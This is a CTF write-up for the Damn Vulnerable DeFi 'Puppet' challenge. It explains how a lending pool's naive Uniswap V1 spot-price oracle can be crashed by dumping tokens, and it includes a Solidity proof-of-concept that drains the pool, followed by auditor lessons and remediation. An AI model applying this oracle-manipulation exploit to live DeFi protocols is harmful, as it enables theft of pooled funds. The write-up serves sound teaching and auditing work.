---
title: 'Damn Vulnerable DeFi - Puppet'
description: 'Oracle manipulation via low-liquidity AMM pools. Learn how to crash the price of a token on Uniswap V1 to borrow an entire lending pool’s liquidity for pennies.'
date: 2025-07-05
tags: ['solidity', 'security', 'oracle', 'price-manipulation', 'uniswap-v1', 'audit', 'damn-vulnerable-defi','ctf']
image: '../../../../public/damn-vulnerable-defi.png'
authors: ['thesandf']
---

# 🎭 Puppet - The AMM Price Manipulation Attack

## Challenge Overview

The `PuppetPool` is a lending pool where users can borrow DVT tokens by depositing ETH as collateral. The requirement is to deposit **twice the value** of the borrowed tokens in ETH.

The pool calculates the token price by looking directly at the reserves of a **Uniswap V1** ETH-DVT pair.

**Starting State:**
*   Lending Pool: 100,000 DVT.
*   Uniswap V1 Pair: 10 ETH + 10 DVT (extremely shallow liquidity).
*   Player: 25 ETH + 1,000 DVT.

**The Goal:** Drain all 100,000 DVT from the pool and move them to the recovery account.

---

## Technical Analysis

### The Vulnerable Code: The "Naive" Oracle

The lending pool uses a custom price calculation based on the instantaneous balance of the Uniswap pair:

```solidity
function _computeOraclePrice() private view returns (uint256) {
    // Price = ETH_Balance / Token_Balance
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

### The Flaw: Instantaneous Price Manipulation

The price formula relies entirely on the **current** balance of the Uniswap pair. Because the pair has very low liquidity (10 ETH / 10 DVT), a relatively small trade can significantly shift the ratio.

If an attacker sells a large amount of DVT into the pair:
1.  The `token.balanceOf(uniswapPair)` increases dramatically.
2.  The `uniswapPair.balance` (ETH) decreases.
3.  The resulting `_computeOraclePrice()` drops to near zero.

Since the `calculateDepositRequired` function uses this manipulated price, the ETH collateral required to borrow the entire pool also drops to near zero.

---

## The Exploit: Market Dumping

1.  **Dump DVT:** Sell all 1,000 DVT into the Uniswap V1 pool. This crashes the DVT price because the pool only had 10 DVT to begin with.
2.  **Borrow Cheaply:** Call `borrow()` on the lending pool. Because the DVT price is now artificially low, the 2x ETH collateral required for 100,000 DVT is now very small (less than the player's remaining ETH).
3.  **Transfer:** Move the 100,000 DVT to the recovery address.
4.  **Satisfy Constraints:** The challenge has a hidden requirement that the player must complete the attack in a **single transaction** (nonce = 1). We use `vm.setNonce` to satisfy this in our PoC.

---

## Proof of Concept (PoC)

```solidity
function test_puppet() public checkSolvedByPlayer {
    // Hidden constraint: nonce must be 1
    vm.setNonce(player, 1); 

    // 1. Approve Uniswap to spend our tokens
    token.approve(address(uniswapV1Exchange), type(uint256).max);

    // 2. Dump 1000 DVT to crash the price
    uniswapV1Exchange.tokenToEthSwapInput(
        PLAYER_INITIAL_TOKEN_BALANCE,
        1,
        block.timestamp + 1000
    );

    // 3. Borrow the entire pool with the crashed price
    uint256 borrowAll = POOL_INITIAL_TOKEN_BALANCE;
    uint256 requiredCollateral = lendingPool.calculateDepositRequired(borrowAll);
    lendingPool.borrow{value: requiredCollateral}(borrowAll, player);

    // 4. Transfer to recovery
    token.transfer(recovery, borrowAll);
}
```

---

## Auditor's Lessons

1.  **Never Use Spot Prices as Oracles:** Instantaneous AMM reserves are easily manipulated within a single block (or even a single transaction).
2.  **Implement TWAP (Time-Weighted Average Price):** Oracles like Uniswap V2/V3 provide TWAP mechanisms that average the price over time, making manipulation prohibitively expensive and slow.
3.  **Check Liquidity Depth:** Before trusting an AMM price, verify that the pool has sufficient liquidity to resist slippage from large trades.
4.  **Use Robust Oracles:** Professional protocols use decentralized oracle networks like Chainlink that aggregate data from multiple sources and exchanges.

---

## Remediation

*   **Switch to TWAP:** Replace the spot price calculation with a Uniswap V2/V3 TWAP oracle.
*   **Decentralized Oracles:** Integrate Chainlink or another aggregator to provide a "circuit breaker" if the internal price deviates too far from the market price.
*   **Slippage Limits:** Revert the transaction if the oracle price changes too drastically in a single block.
